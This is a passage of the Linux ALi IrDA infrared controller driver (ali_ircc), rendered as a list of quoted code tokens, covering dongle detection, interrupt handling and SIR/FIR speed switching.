"|", "=", "0x80", ";", "/", "/", "these", "two", "steps", "make", "RX", "mode", "tmp", "&", "=", "0xbf", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_LCR_B", ")", ";", "/", "*", "Disable", "Interrupt", "*", "/", "outb", "(", "0x00", ",", "iobase", "+", "FIR_IER", ")", ";", "/", "*", "Switch", "to", "SIR", "space", "*", "/", "FIR2SIR", "(", "iobase", ")", ";", "net_info_ratelimited", "(", "\"%", "s", ",", "driver", "loaded", "(", "Benjamin", "Kong", ")", "\\", "n", "\"", ",", "ALI_IRCC_DRIVER_NAME", ")", ";", "/", "*", "Enable", "receive", "interrupts", "*", "/", "/", "/", "outb", "(", "UART_IER_RDI", ",", "iobase", "+", "UART_IER", ")", ";", "/", "/", "benjamin", "2000", "/", "11", "/", "23", "01", ":", "25PM", "/", "/", "Turn", "on", "the", "interrupts", "in", "ali_ircc_net_open", "return", "0", ";", "}", "/", "*", "*", "Function", "ali_ircc_read_dongle_id", "(", "int", "index", ",", "info", ")", "*", "*", "Try", "to", "read", "dongle", "identification", ".", "This", "procedure", "needs", "to", "be", "executed", "*", "once", "after", "power", "-", "on", "/", "reset", ".", "It", "also", "needs", "to", "be", "used", "whenever", "you", "suspect", "*", "that", "the", "user", "may", "have", "plugged", "/", "unplugged", "the", "IrDA", "Dongle", ".", "*", "/", "static", "int", "ali_ircc_read_dongle_id", "(", "int", "i", ",", "chipio_t", "*", "info", ")", "{", "int", "dongle_id", ",", "reg", ";", "int", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "/", "*", "Enter", "Configuration", "*", "/", "outb", "(", "chips", "[", "i", "]", ".", "entr1", ",", "cfg_base", ")", ";", "outb", "(", "chips", "[", "i", "]", ".", "entr2", ",", "cfg_base", ")", ";", "/", "*", "Select", "Logical", "Device", "5", "Registers", "(", "UART2", ")", "*", "/", "outb", "(", "0x07", ",", "cfg_base", ")", ";", "outb", "(", "0x05", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "Read", "Dongle", "ID", "*", "/", "outb", "(", "0xf0", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "dongle_id", "=", "(", "(", "reg", ">", ">", "6", ")", "&", "0x02", ")", "|", "(", "(", "reg", ">", ">", "5", ")", "&", "0x01", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "dongle_id", "=", "%", "d", ",", "dongle_types", "=", "%", "s", "\\", "n", "\"", ",", "__func__", ",", "dongle_id", ",", "dongle_types", "[", "dongle_id", "]", ");", "/", "*", "Exit", "configuration", "*", "/", "outb", "(", "0xbb", ",", "cfg_base", ")", ";", "return", "dongle_id", ";", "}", "/", "*", "*", "Function", "ali_ircc_interrupt", "(", "irq", ",", "dev_id", ",", "regs", ")", "*", "*", "An", "interrupt", "from", "the", "chip", "has", "arrived", ".", "Time", "to", "do", "some", "work", "*", "*", "/", "static", "irqreturn_t", "ali_ircc_interrupt", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "ali_ircc_cb", "*", "self", ";", "int", "ret", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "spin_lock", "(", "&", "self", "-", ">", "lock", ")", ";", "/", "*", "Dispatch", "interrupt", "handler", "for", "the", "current", "speed", "*", "/", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "ret", "=", "ali_ircc_fir_interrupt", "(", "self", ")", ";", "else", "ret", "=", "ali_ircc_sir_interrupt", "(", "self", ")", ";", "spin_unlock", "(", "&", "self", "-", ">", "lock", ")", ";", "return", "ret", ";", "}", "/", "*", "*", "Function", "ali_ircc_fir_interrupt", "(", "irq", ",", "struct", "ali_ircc_cb", "*", "self", ")", "*", "*", "Handle", "MIR", "/", "FIR", "interrupt", "*", "*", "/", "static", "irqreturn_t", "ali_ircc_fir_interrupt", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "__u8", "eir", ",", "OldMessageCount", ";", "int", "iobase", ",", "tmp", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "self", "-", ">", "InterruptID", "=", "inb", "(", "iobase", "+", "FIR_IIR", ")", ";", "self", "-", ">", "BusStatus", "=", "inb", "(", "iobase", "+", "FIR_BSR", ")", ";", "OldMessageCount", "=", "(", "self", "-", ">", "LineStatus", "+", "1", ")", "&", "0x07", ";", "self", "-", ">", "LineStatus", "=", "inb", "(", "iobase", "+", "FIR_LSR", ")", ";", "/", "/", "self", "-", ">", "ier", "=", "inb", "(", "iobase", "+", "FIR_IER", ")", ";", "2000", "/", "12", "/", "1", "04", ":", "32PM", "eir", "=", "self", "-", ">", "InterruptID", "&", "self", "-", ">", "ier", ";", "/", "*", "Mask", "out", "the", "interesting", "ones", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "self", "-", ">", "InterruptID", "=", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "InterruptID", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "self", "-", ">", "LineStatus", "=", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "LineStatus", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "self", "-", ">", "ier", "=", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "ier", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "eir", "=", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "eir", ")", ";", "/", "*", "Disable", "interrupts", "*", "/", "SetCOMInterrupts", "(", "self", ",", "FALSE", ")", ";", "/", "*", "Tx", "or", "Rx", "Interrupt", "*", "/", "if", "(", "eir", "&", "IIR_EOM", ")", "{", "if", "(", "self", "-", ">", "io", ".", "direction", "=", "=", "IO_XMIT", ")", "/", "*", "TX", "*", "/", "{", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "IIR_EOM", "(", "Tx", ")", "*", "**", "**", "**", "\\", "n", "\"", ",", "__func__", ")", ";", "if", "(", "ali_ircc_dma_xmit_complete", "(", "self", ")", ")", "{", "if", "(", "irda_device_txqueue_empty", "(", "self", "-", ">", "netdev", ")", ")", "{", "/", "*", "Prepare", "for", "receive", "*", "/", "ali_ircc_dma_receive", "(", "self", ")", ";", "self", "-", ">", "ier", "=", "IER_EOM", ";", "}", "}", "else", "{", "self", "-", ">", "ier", "=", "IER_EOM", ";", "}", "}", "else", "/", "*", "RX", "*", "/", "{", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "IIR_EOM", "(", "Rx", ")", "*", "**", "**", "**", "\\", "n", "\"", ",", "__func__", ")", ";", "if", "(", "OldMessageCount", ">", "(", "(", "self", "-", ">", "LineStatus", "+", "1", ")", "&", "0x07", ")", ")", "{", "self", "-", ">", "rcvFramesOverflow", "=", "TRUE", ";", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "self", "-", ">", "rcvFramesOverflow", "=", "TRUE", "*", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "}", "if", "(", "ali_ircc_dma_receive_complete", "(", "self", ")", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "receive", "complete", "*", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "self", "-", ">", "ier", "=", "IER_EOM", ";", "}", "else", "{", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "Not", "receive", "complete", "*", "**", "**", "**", "*\\", "n", "\"", ",", "__func__", ")", ";", "self", "-", ">", "ier", "=", "IER_EOM", "|", "IER_TIMER", ";", "}", "}", "}", "/", "*", "Timer", "Interrupt", "*", "/", "else", "if", "(", "eir", "&", "IIR_TIMER", ")", "{", "if", "(", "OldMessageCount", ">", "(", "(", "self", "-", ">", "LineStatus", "+", "1", ")", "&", "0x07", ")", ")", "{", "self", "-", ">", "rcvFramesOverflow", "=", "TRUE", ";", "pr_debug", "(", "\"%", "s", "(", "),", "*", "**", "**", "**", "self", "-", ">", "rcvFramesOverflow", "=", "TRUE", "*", "**", "**", "**", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "/", "*", "Disable", "Timer", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "tmp", "=", "inb", "(", "iobase", "+", "FIR_CR", ")", ";", "outb", "(", "tmp", "&", "~", "CR_TIMER_EN", ",", "iobase", "+", "FIR_CR", ")", ";", "/", "*", "Check", "if", "this", "is", "a", "Tx", "timer", "interrupt", "*", "/", "if", "(", "self", "-", ">", "io", ".", "direction", "=", "=", "IO_XMIT", ")", "{", "ali_ircc_dma_xmit", "(", "self", ")", ";", "/", "*", "Interrupt", "on", "EOM", "*", "/", "self", "-", ">", "ier", "=", "IER_EOM", ";", "}", "else", "/", "*", "Rx", "*", "/", "{", "if", "(", "ali_ircc_dma_receive_complete", "(", "self", ")", ")", "{", "self", "-", ">", "ier", "=", "IER_EOM", ";", "}", "else", "{", "self", "-", ">", "ier", "=", "IER_EOM", "|", "IER_TIMER", ";", "}", "}", "}", "/", "*", "Restore", "Interrupt", "*", "/", "SetCOMInterrupts", "(", "self", ",", "TRUE", ")", ";", "return", "IRQ_RETVAL", "(", "eir", ")", ";", "}", "/", "*", "*", "Function", "ali_ircc_sir_interrupt", "(", "irq", ",", "self", ",", "eir", ")", "*", "*", "Handle", "SIR", "interrupt", "*", "*", "/", "static", "irqreturn_t", "ali_ircc_sir_interrupt", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "int", "iobase", ";", "int", "iir", ",", "lsr", ";", "iobase", "=", "self", "-", ">", "io", ".", "sir_base", ";", "iir", "=", "inb", "(", "iobase", "+", "UART_IIR", ")", "&", "UART_IIR_ID", ";", "if", "(", "iir", ")", "{", "/", "*", "Clear", "interrupt", "*", "/", "lsr", "=", "inb", "(", "iobase", "+", "UART_LSR", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "iir", "=", "%", "02x", ",", "lsr", "=", "%", "02x", ",", "iobase", "=", "%#", "x", "\\", "n", "\"", ",", "__func__", ",", "iir", ",", "lsr", ",", "iobase", ")", ";", "switch", "(", "iir", ")", "{", "case", "UART_IIR_RLSI", ":", "pr_debug", "(", "\"%", "s", "(", "),", "RLSI", "\\", "n", "\"", ",", "__func__", ")", ";", "break", ";", "case", "UART_IIR_RDI", ":", "/", "*", "Receive", "interrupt", "*", "/", "ali_ircc_sir_receive", "(", "self", ")", ";", "break", ";", "case", "UART_IIR_THRI", ":", "if", "(", "lsr", "&", "UART_LSR_THRE", ")", "{", "/", "*", "Transmitter", "ready", "for", "data", "*", "/", "ali_ircc_sir_write_wakeup", "(", "self", ")", ";", "}", "break", ";", "default", ":", "pr_debug", "(", "\"%", "s", "(", "),", "unhandled", "IIR", "=", "%#", "x", "\\", "n", "\"", ",", "__func__", ",", "iir", ")", ";", "break", ";", "}", "}", "return", "IRQ_RETVAL", "(", "iir", ")", ";", "}", "/", "*", "*", "Function", "ali_ircc_sir_receive", "(", "self", ")", "*", "*", "Receive", "one", "frame", "from", "the", "infrared", "port", "*", "*", "/", "static", "void", "ali_ircc_sir_receive", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "int", "boguscount", "=", "0", ";", "int", "iobase", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "sir_base", ";", "/", "*", "*", "Receive", "all", "characters", "in", "Rx", "FIFO", ",", "unwrap", "and", "unstuff", "them", ".", "*", "async_unwrap_char", "will", "deliver", "all", "found", "frames", "*", "/", "do", "{", "async_unwrap_char", "(", "self", "-", ">", "netdev", ",", "&", "self", "-", ">", "netdev", "-", ">", "stats", ",", "&", "self", "-", ">", "rx_buff", ",", "inb", "(", "iobase", "+", "UART_RX", ")", ");", "/", "*", "Make", "sure", "we", "don", "'", "t", "stay", "here", "too", "long", "*", "/", "if", "(", "boguscount", "+", "+", ">", "32", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "breaking", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "break", ";", "}", "}", "while", "(", "inb", "(", "iobase", "+", "UART_LSR", ")", "&", "UART_LSR_DR", ")", ";", "}", "/", "*", "*", "Function", "ali_ircc_sir_write_wakeup", "(", "tty", ")", "*", "*", "Called", "by", "the", "driver", "when", "there", "'", "s", "room", "for", "more", "data", ".", "If", "we", "have", "*", "more", "packets", "to", "send", ",", "we", "send", "them", "here", ".", "*", "*", "/", "static", "void", "ali_ircc_sir_write_wakeup", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "int", "actual", "=", "0", ";", "int", "iobase", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "sir_base", ";", "/", "*", "Finished", "with", "frame", "?", "*", "/", "if", "(", "self", "-", ">", "tx_buff", ".", "len", ">", "0", ")", "{", "/", "*", "Write", "data", "left", "in", "transmit", "buffer", "*", "/", "actual", "=", "ali_ircc_sir_write", "(", "iobase", ",", "self", "-", ">", "io", ".", "fifo_size", ",", "self", "-", ">", "tx_buff", ".", "data", ",", "self", "-", ">", "tx_buff", ".", "len", ")", ";", "self", "-", ">", "tx_buff", ".", "data", "+", "=", "actual", ";", "self", "-", ">", "tx_buff", ".", "len", "-", "=", "actual", ";", "}", "else", "{", "if", "(", "self", "-", ">", "new_speed", ")", "{", "/", "*", "We", "must", "wait", "until", "all", "data", "are", "gone", "*", "/", "while", "(", "!(", "inb", "(", "iobase", "+", "UART_LSR", ")", "&", "UART_LSR_TEMT", ")", ")", "pr_debug", "(", "\"%", "s", "(", "),", "UART_LSR_THRE", "\\", "n", "\"", ",", "__func__", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "Changing", "speed", "!", "self", "-", ">", "new_speed", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "new_speed", ")", ";", "ali_ircc_change_speed", "(", "self", ",", "self", "-", ">", "new_speed", ")", ";", "self", "-", ">", "new_speed", "=", "0", ";", "/", "/", "benjamin", "2000", "/", "11", "/", "10", "06", ":", "32PM", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "ali_ircc_change_speed", "from", "UART_LSR_TEMT", "\\", "n", "\"", ",", "__func__", ")", ";", "self", "-", ">", "ier", "=", "IER_EOM", ";", "/", "/", "SetCOMInterrupts", "(", "self", ",", "TRUE", ")", ";", "return", ";", "}", "}", "else", "{", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "/", "*", "Turn", "on", "receive", "interrupts", "*", "/", "outb", "(", "UART_IER_RDI", ",", "iobase", "+", "UART_IER", ")", ";", "}", "}", "static", "void", "ali_ircc_change_speed", "(", "struct", "ali_ircc_cb", "*", "self", ",", "__u32", "baud", ")", "{", "struct", "net_device", "*", "dev", "=", "self", "-", ">", "netdev", ";", "int", "iobase", ";", "pr_debug", "(", "\"%", "s", "(", "),", "setting", "speed", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "baud", ")", ";", "/", "*", "This", "function", "*", "must", "*", "be", "called", "with", "irq", "off", "and", "spin", "-", "lock", ".", "*", "-", "Jean", "II", "*", "/", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "SetCOMInterrupts", "(", "self", ",", "FALSE", ")", ";", "/", "/", "2000", "/", "11", "/", "24", "11", ":", "43AM", "/", "*", "Go", "to", "MIR", ",", "FIR", "Speed", "*", "/", "if", "(", "baud", ">", "115200", ")", "{", "ali_ircc_fir_change_speed", "(", "self", ",", "baud", ")", ";", "/", "*", "Install", "FIR", "xmit", "handler", "*", "/", "dev", "-", ">", "netdev_ops", "=", "&", "ali_ircc_fir_ops", ";", "/", "*", "Enable", "Interuupt", "*", "/", "self", "-", ">", "ier", "=", "IER_EOM", ";", "/", "/", "benjamin", "2000", "/", "11", "/", "20", "07", ":", "24PM", "/", "*", "Be", "ready", "for", "incoming", "frames", "*", "/", "ali_ircc_dma_receive", "(", "self", ")", ";", "/", "/", "benajmin", "2000", "/", "11", "/", "8", "07", ":", "46PM", "not", "complete", "}", "/", "*", "Go", "to", "SIR", "Speed", "*", "/", "else", "{", "ali_ircc_sir_change_speed", "(", "self", ",", "baud", ")", ";", "/", "*", "Install", "SIR", "xmit", "handler", "*", "/", "dev", "-", ">", "netdev_ops", "=", "&", "ali_ircc_sir_ops", ";", "}", "SetCOMInterrupts", "(", "self", ",", "TRUE", ")", ";", "/", "/", "2000", "/", "11", "/", "24", "11", ":", "43AM", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "static", "void", "ali_ircc_fir_change_speed", "(", "struct", "ali_ircc_cb", "*", "priv", ",", "__u32", "baud", ")", "{", "int", "iobase", ";", "struct", "ali_ircc_cb", "*", "self", "=", "priv", ";", "struct", "net_device", "*", "dev", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "dev", "=", "self", "-", ">", "netdev", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "pr_debug", "(", "\"%", "s", "(", "),", "self", "-", ">", "io", ".", "speed", "=", "%", "d", ",", "change", "to", "speed", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "io", ".", "speed", ",", "baud", ")", ";", "/", "*", "Come", "from", "SIR", "speed", "*", "/", "if", "(", "self", "-", ">", "io", ".", "speed", "<", "=", "115200", ")", "{", "SIR2FIR", "(", "iobase", ")", ";", "}", "/", "*", "Update", "accounting", "for", "new", "speed", "*", "/", "self", "-", ">", "io", ".", "speed", "=", "baud", ";", "/", "/", "Set", "Dongle", "Speed", "mode", "ali_ircc_change_dongle_speed", "(", "self", ",", "baud", ")", ";", "}", "/", "*", "*", "Function", "ali_sir_change_speed", "(", "self", ",", "speed", ")", "*", "*", "Set", "speed", "of", "IrDA", "port", "to", "specified", "baudrate", "*", "*", "/", "static", "void", "ali_ircc_sir_change_speed", "(", "struct", "ali_ircc_cb", "*", "priv", ",", "__u32", "speed", ")", "{", "struct", "ali_ircc_cb", "*", "self", "=", "priv", ";", "int", "iobase", ";", "int", "fcr", ";", "/", "*", "FIFO", "control", "reg", "*", "/", "int", "lcr", ";", "/", "*", "Line", "control", "reg", "*", "/", "int", "divisor", ";", "pr_debug", "(", "\"%", "s", "(", "),", "Setting", "speed", "to", ":", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "speed", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "sir_base", ";", "/", "*", "Come", "from", "MIR", "or", "FIR", "speed", "*", "/", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "{", "/", "/", "Set", "Dongle", "Speed", "mode", "first", "ali_ircc_change_dongle_speed", "(", "self", ",", "speed", ")", ";", "FIR2SIR", "(", "iobase", ")", ";", "}", "/", "/", "Clear", "Line", "and", "Auxiluary", "status", "registers", "2000", "/", "11", "/", "24", "11", ":", "47AM", "inb", "(", "iobase", "+", "UART_LSR", ")", ";", "inb", "(", "iobase", "+", "UART_SCR", ")", ";", "/", "*", "Update", "accounting", "for", "new", "speed", "*", "/", "self", "-", ">", "io", ".", "speed", "=", "speed", ";", "divisor", "=", "115200", "/", "speed", ";", "fcr", "=", "UART_FCR_ENABLE_FIFO", ";", "/", "*", "*", "Use", "trigger", "level", "1", "to", "avoid", "3", "ms", ".", "timeout", "delay", "at", "9600", "bps", ",", "and", "*", "almost", "1", ",", "7", "ms", "at", "19200", "bps", ".", "At", "speeds", "above", "that", "we", "can", "just", "forget", "*", "about", "this", "timeout", "since", "it", "will", "always", "be", "fast", "enough", ".", "*", "/", "if", "(", "self", "-", ">", "io", ".", "speed", "<", "38400", ")", "fcr", "|", "=", "UART_FCR_TRIGGER_1", ";", "else", "fcr", "|", "=", "UART_FCR_TRIGGER_14", ";", "/", "*", "IrDA", "ports", "use", "8N1", "*", "/", "lcr", "=", "UART_LCR_WLEN8", ";", "outb", "(", "UART_LCR_DLAB", "|", "lcr", ",", "iobase", "+", "UART_LCR", ")", ";", "/", "*", "Set", "DLAB", "*", "/", "outb", "(", "divisor", "&", "0xff", ",", "iobase", "+", "UART_DLL", ")", ";", "/", "*", "Set", "speed", "*", "/", "outb", "(", "divisor", ">", ">", "8", ",", "iobase", "+", "UART_DLM", ")", ";", "outb", "(", "lcr", ",", "iobase", "+", "UART_LCR", ")", ";", "/", "*", "Set", "8N1", "*", "/", "outb", "(", "fcr", ",", "iobase", "+", "UART_FCR", ")", ";", "/", "*", "Enable", "FIFO", "'", "s", "*", "/", "/", "*", "without", "this", ",", "the", "connection", "will", "be", "broken", "after", "come", "back", "from", "FIR", "speed", ",", "but", "with", "this", ",", "the", "SIR", "connection", "is", "harder", "to", "established", "*", "/", "outb", "(", "(", "UART_MCR_DTR", "|", "UART_MCR_RTS", "|", "UART_MCR_OUT2", ")", ",", "iobase", "+", "UART_MCR", ")", ";", "}", "static", "void", "ali_ircc_change_dongle_speed", "(", "struct", "ali_ircc_cb", "*", "priv", ",", "int", "speed", ")", "{", "struct", "ali_ircc_cb", "*", "self", "=", "priv", ";", "int", "iobase", ",", "dongle_id", ";", "int", "tmp", "=", "0", ";", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "or", "iobase", "=", "self", "-", ">", "io", ".", "sir_base", ";", "*", "/", "dongle_id", "=", "self", "-", ">", "io", ".", "dongle_id", ";", "/", "*", "We", "are", "already", "locked", ",", "no", "need", "to", "do", "it", "again", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "Set", "Speed", "for", "%", "s", ",", "Speed", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "dongle_types", "[", "dongle_id", "]", ",", "speed", ")", ";", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "tmp", "=", "inb", "(", "iobase", "+", "FIR_IRDA_CR", ")", ";", "/", "*", "IBM", "type", "dongle", "*", "/", "if", "(", "dongle_id", "=", "=", "0", ")", "{", "if", "(", "speed", "=", "=", "4000000", ")", "{", "/", "/", "__", "__", "/", "/", "SD", "/", "MODE", "__", "|", "|", "__", "__", "/", "/", "__", "__", "/", "/", "IRTX", "__", "__", "|", "|", "__", "/", "/", "T1", "T2", "T3", "T4", "T5", "tmp", "&", "=", "~", "IRDA_CR_HDLC", ";", "/", "/", "HDLC", "=", "0", "tmp", "|", "=", "IRDA_CR_CRC", ";", "/", "/", "CRC", "=", "1", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "/", "/", "T1", "-", ">", "SD", "/", "MODE", ":", "0", "IRTX", ":", "0", "tmp", "&", "=", "~", "0x09", ";", "tmp", "|", "=", "0x02", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "udelay", "(", "2", ")", ";", "/", "/", "T2", "-", ">", "SD", "/", "MODE", ":", "1", "IRTX", ":", "0", "tmp", "&", "=", "~", "0x01", ";", "tmp", "|", "=", "0x0a", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "udelay", "(", "2", ")", ";", "/", "/", "T3", "-", ">", "SD", "/", "MODE", ":", "1", "IRTX", ":", "1", "tmp", "|", "=", "0x0b", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "udelay", "(", "2", ")", ";", "/", "/", "T4", "-", ">", "SD", "/", "MODE", ":", "0", "IRTX", ":", "1", "tmp", "&", "=", "~", "0x08", ";", "tmp", "|", "=", "0x03", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "udelay", "(", "2", ")", ";", "/", "/", "T5", "-", ">", "SD", "/", "MODE", ":", "0", "IRTX", ":", "0", "tmp", "&", "=", "~", "0x09", ";", "tmp", "|", "=", "0x02", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "udelay", "(", "2", ")", ";", "/", "/", "reset", "-", ">", "Normal", "TX", "output", "Signal", "outb", "(", "tmp", "&", "~", "0x02", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "}", "else", "/", "*", "speed", "<", "=", "1152000", "*", "/", "{", "/", "/", "__", "/", "/", "SD", "/", "MODE", "__", "|", "|", "__", "/", "/", "/", "/", "IRTX", "________", "/", "/", "T1", "T2", "T3", "/", "*", "MIR", "115200", ",", "57600", "*", "/", "if", "(", "speed", "=", "=", "1152000", ")", "{", "tmp", "|", "=", "0xA0", ";", "/", "/", "HDLC", "=", "1", ",", "1", ".", "152Mbps", "=", "1", "}", "else", "{", "tmp", "&", "=~", "0x80", ";", "/", "/", "HDLC", "0", ".", "576Mbps", "tmp", "|", "=", "0x20", ";", "/", "/", "HDLC", "=", "1", ",", "}", "tmp", "|", "=", "IRDA_CR_CRC", ";", "/", "/", "CRC", "=", "1", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "/", "*", "MIR", "115200", ",", "57600", "*", "/", "/", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "/", "/", "T1", "-", ">", "SD", "/", "MODE", ":", "0", "IRTX", ":", "0", "tmp", "&", "=", "~", "0x09", ";", "tmp", "|", "=", "0x02", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "udelay", "(", "2", ")", ";", "/", "/", "T2", "-", ">", "SD", "/", "MODE", ":", "1", "IRTX", ":", "0", "tmp", "&", "=", "~", "0x01", ";", "tmp", "|", "=", "0x0a", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "/", "/", "T3", "-", ">", "SD", "/", "MODE", ":", "0", "IRTX", ":", "0", "tmp", "&", "=", "~", "0x09", ";", "tmp", "|", "=", "0x02", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "udelay", "(", "2", ")", ";", "/", "/", "reset", "-", ">", "Normal", "TX", "output", "Signal", "outb", "(", "tmp", "&", "~", "0x02", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "}", "}", "else", "if", "(", "dongle_id", "=", "=", "1", ")", "/", "*", "HP", "HDSL", "-", "3600", "*", "/", "{", "switch", "(", "speed", ")", "{", "case", "4000000", ":", "tmp", "&", "=", "~", "IRDA_CR_HDLC", ";", "/", "/", "HDLC", "=", "0", "break", ";", "case", "1152000", ":", "tmp", "|", "=", "0xA0", ";", "/", "/", "HDLC", "=", "1", ",", "1", ".", "152Mbps", "=", "1", "break", ";", "case", "576000", ":", "tmp", "&", "=~", "0x80", ";", "/", "/", "HDLC", "0", ".", "576Mbps", "tmp", "|", "=", "0x20", ";", "/", "/", "HDLC", "=", "1", ",", "break", ";", "}", "tmp", "|", "=", "IRDA_CR_CRC", ";", "/", "/", "CRC", "=", "1", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "}", "else", "/", "*", "HP", "HDSL", "-", "1100", "*", "/", "{", "if", "(", "speed", "<", "=", "115200", ")", "/", "*", "SIR", "*", "/", "{", "tmp", "&", "=", "~", "IRDA_CR_FIR_SIN", ";", "/", "/", "HP", "sin", "select", "=", "0", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "}", "else", "/", "*", "MIR", "FIR", "*", "/", "{", "switch", "(", "speed", ")", "{", "case", "4000000", ":", "tmp", "&", "=", "~", "IRDA_CR_HDLC", ";", "/", "/", "HDLC", "=", "0", "break", ";", "case", "1152000", ":", "tmp", "|", "=", "0xA0", ";", "/", "/", "HDLC", "=", "1", ",", "1", ".", "152Mbps", "=", "1", "break", ";", "case", "576000", ":", "tmp", "&", "=~", "0x80", ";", "/", "/", "HDLC", "0", ".", "576Mbps", "tmp", "|", "=", "0x20", ";", "/", "/", "HDLC", "=", "1", ",", "break", ";", "}", "tmp", "|", "=", "IRDA_CR_CRC", ";", "/", "/", "CRC", "=", "1", "tmp", "|", "=", "IRDA_CR_FIR_SIN", ";", "/", "/", "HP", "sin", "select", "=", "1", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "tmp", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "}", "}", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "}", "/", "*", "*", "Function", "ali_ircc_sir_write", "(", "driver", ")", "*", "*", "Fill", "Tx", "FIFO", "with", "transmit", "data", "*", "*", "/", "static", "int", "ali_ircc_sir_write", "(", "int", "iobase", ",", "int", "fifo_size", ",", "__u8", "*", "buf", ",", "int", "len", ")", "{", "int", "actual", "=", "0", ";", "/", "*", "Tx", "FIFO", "should", "be", "empty", "!", "*", "/", "if", "(", "!(", "inb", "(", "iobase", "+", "UART_LSR", ")", "&", "UART_LSR_THRE", ")", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "failed", ",", "fifo", "not", "empty", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", "0", ";", "}", "/", "*", "Fill", "FIFO", "with", "current", "frame", "*", "/", "while", "(", "(", "fifo_size", "-", "-", ">", "0", ")", "&", "&", "(", "actual", "<", "len", ")", ")", "{", "/", "*", "Transmit", "next", "byte", "*", "/", "outb", "(", "buf", "[", 